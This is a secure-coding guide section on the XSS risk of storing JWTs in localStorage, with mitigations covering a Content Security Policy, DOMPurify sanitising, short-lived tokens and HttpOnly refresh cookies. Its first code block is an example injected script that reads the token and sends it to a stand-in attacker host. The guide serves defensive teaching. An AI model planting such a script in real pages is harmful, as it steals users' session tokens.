## XSS Risk with localStorage JWT

**Critical Security Trade-off:**

Storing JWT in localStorage eliminates CSRF risk but introduces XSS risk:

```javascript
// ❌ VULNERABLE: XSS can steal JWT from localStorage

// Attacker injects malicious script via XSS
<script>
  const stolenToken = localStorage.getItem('jwt');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: stolenToken })
  });
</script>

// Attacker now has JWT and can make authenticated requests
```

**XSS Mitigation Strategies:**

1. **Content Security Policy (CSP):**

```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives(
            "default-src 'self'; " +
            "script-src 'self'; " +  // Only allow scripts from same origin
            "object-src 'none'; " +
            "base-uri 'self'"
        )
    )
);
```

2. **Input validation and output encoding:**

```javascript
// ✅ SECURE: Escape user input before rendering
import DOMPurify from 'dompurify';

function displayUserComment(comment) {
    const sanitized = DOMPurify.sanitize(comment);
    document.getElementById('comment').textContent = sanitized;
}
```

3. **Short-lived JWTs with refresh tokens:**

```java
// ✅ Access token expires in 15 minutes
String accessToken = Jwts.builder()
    .setSubject(username)
    .setExpiration(new Date(System.currentTimeMillis() + 15 * 60 * 1000))
    .signWith(signingKey)
    .compact();

// ✅ Refresh token expires in 7 days, stored in HttpOnly cookie
Cookie refreshCookie = new Cookie("refresh_token", refreshToken);
refreshCookie.setHttpOnly(true);  // XSS cannot read
refreshCookie.setSecure(true);
refreshCookie.setPath("/api/auth/refresh");
refreshCookie.setMaxAge(7 * 24 * 60 * 60);
response.addCookie(refreshCookie);
```

